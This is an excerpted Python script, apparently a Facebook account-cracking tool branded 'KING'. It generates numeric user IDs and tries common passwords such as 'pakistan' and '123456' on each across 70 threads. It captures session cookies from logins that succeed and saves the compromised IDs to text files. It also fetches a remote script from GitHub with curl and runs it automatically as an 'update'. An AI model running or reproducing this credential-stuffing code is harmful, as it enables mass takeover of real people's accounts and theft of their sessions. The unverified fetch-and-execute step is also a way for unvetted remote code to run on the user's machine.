...
os.system('xdg-open http://wa.me/+93770957668')
...
logo=("""              
 ____   _    _  _______ _____   __ ___        ___    _     
|  _ \ / \  | |/ |_   _|_ _\ \ / // \ \      / / \  | |    
| |_) / _ \ | ' /  | |  | | \ V // _ \ \ /\ / / _ \ | |    
|  __/ ___ \| . \  | |  | |  | |/ ___ \ V  V / ___ \| |___ 
|_| /_/   \_|_|\_\ |_| |___| |_/_/   \_\_/\_/_/   \_|_____|
\33[1;37m----------------------------------------------
→   Owner      :  KING
→   Facebook   :  KING
→   Github     : KING
...
try:
    ...
    proxy = requests.get('https://raw.githubusercontent.com/KING-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/KING-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf KING')
        os.system('curl -L https://raw.githubusercontent.com/KING-JUTT/KING/main/KING.py > KING.py')
        os.system('python KING.py')
    else:pass
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+93770957668?text=KING💜🐰Sir😪💕')
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100050824939857');riaz()
	if riaz1 =='2':
		bangla()
	else:
		print('\n\033[1;31mChoose vKINGd option\033[0;97m')
		riaz()
...
def annu():
    ...
    if riaz1 =='4':
        ...
        print('\n\033[1;37m[+] SELECT VKINGD optION\033[0;97m')        
def bangla():
	os.system('clear')
	print(logo)
...
def b1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode,'pakistan','khankhan','khan123','mKINGk123','Ahmad123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'MKINGK123','pakistan','khankhan','khan123','khan12345','123456','Ahmad123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[KING-CP] '+uid+' | '+ps+'\x1b[1;97m')
